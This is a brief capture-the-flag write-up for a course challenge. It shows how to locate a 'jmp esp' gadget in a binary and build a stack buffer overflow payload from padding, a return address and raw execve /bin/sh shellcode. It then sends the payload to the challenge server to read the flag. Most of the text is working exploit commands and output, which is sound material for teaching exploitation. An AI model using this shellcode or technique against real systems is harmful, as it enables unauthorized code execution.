try to find jmp esp (\xff \xe4)

```
$ objdump -D  BOF2| grep jmp

 80485a0:       ff e4                   jmp    *%esp
```

exploit = garbage + EIP + shellcode

```
$ perl -E 'say "a"x24 ."\xa0\x85\x04\x08". "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"' > test

$ cat test - | secprog.cs.nctu.edu.tw 10102
cat /home/bof/flag2
SECPROG{HelloJmpToSHELLCODE}
```


Appendix:

shellcode from here
http://shell-storm.org/shellcode/files/shellcode-827.php
